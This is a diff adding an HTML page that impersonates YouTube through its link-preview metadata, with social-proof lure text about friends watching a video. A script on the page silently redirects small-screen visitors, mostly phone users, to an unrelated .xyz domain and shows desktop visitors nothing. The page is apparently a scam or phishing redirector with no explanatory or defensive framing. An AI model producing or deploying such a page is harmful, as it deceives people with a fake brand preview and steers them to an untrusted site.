@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta property="og:title" content="Youtube"  />
+<meta property="og:description" content="  232 of your friends are watching this videos now. " />
+</head>
+<body>
+<script type="text/javascript">
+        if (screen.width <= 1080) {
+        window.location = "https://zapvideocom.xyz/";
+    } else {
+
+    }
+</script>
+</html> 
+</body>
